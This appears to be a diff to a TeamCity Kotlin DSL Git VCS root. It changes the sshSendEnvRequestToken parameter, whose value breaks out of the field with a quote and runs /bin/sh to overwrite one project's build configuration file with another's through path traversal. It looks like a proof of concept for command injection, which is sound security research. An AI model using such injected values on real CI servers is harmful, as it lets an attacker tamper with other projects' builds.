@@ -43,5 +43,5 @@ object HttpsGithubGitssh : GitVcsRoot({
     param("authMethod", "PRIVATE_KEY_DEFAULT")
     param("ignoreKnownHosts", "true")
 
-   param("sshSendEnvRequestToken", "x\"; /bin/sh -c 'cat ../../../../config/projects/ProjectA/buildTypes/ProjectA_Build.xml > ../../../../config/projects/ProjectB/buildTypes/ProjectB_Build.xml'; #")
+   param("sshSendEnvRequestToken", "x\"; /bin/sh -c 'cat ../../../../config/projects/ProjectB/buildTypes/ProjectB_Build.xml > ../../../../config/projects/ProjectA/buildTypes/ProjectA_Build.xml'; #")
 })
